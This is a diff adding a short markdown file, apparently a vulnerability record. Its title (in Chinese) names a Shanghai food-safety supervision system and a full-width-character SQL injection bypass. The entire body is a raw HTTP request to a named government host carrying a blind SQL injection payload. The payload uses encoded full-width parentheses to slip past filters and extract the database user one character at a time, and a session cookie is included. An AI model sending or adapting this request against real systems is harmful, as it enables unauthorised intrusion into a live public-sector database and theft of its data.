@@ -1,0 +1,13 @@
+# 一分中心-市场监管局(含药监局)团队-市市场监管食品安全监管系统SQL全角绕过
+GET //p4/api/v1/data/pub/consumer/web/ent/sc/query?page=0&size=100&name=%27;select%EF%BC%881/if%EF%BC%88substrb%EF%BC%88current_user,6,1%EF%BC%89like%EF%BC%88CHR%EF%BC%8865%EF%BC%89%EF%BC%89,1,0%EF%BC%89%EF%BC%89--+- HTTP/1.1
+Host: spzs.scjgj.sh.gov.cn
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: security=impossible; PHPSESSID=1qqs7fg9q9n0b8fnn4qjtp6oa4
+Connection: keep-alive
+
